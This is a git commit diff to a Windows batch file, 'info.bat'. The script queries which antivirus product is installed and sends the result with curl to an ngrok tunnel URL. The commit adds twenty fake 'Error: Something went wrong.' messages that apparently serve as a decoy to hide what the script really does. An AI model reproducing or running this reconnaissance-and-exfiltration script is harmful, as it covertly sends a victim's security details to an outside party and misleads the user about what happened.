7bebfd40ed4df0af881dde6daffa9e1edc912caf
Omar Samy <osamy7592@gmail.com>
2024-05-04 05:49:39 +0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -1,5 +1,8 @@
 @echo off
+for /l %%i in (1, 1, 20) do (
+    echo Error: Something went wrong.
+)
 for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
 echo Antivirus Information: %antivirus%
 curl --verbose --data "%antivirus%" https://6fa3-197-35-34-224.ngrok-free.app
-exit
+
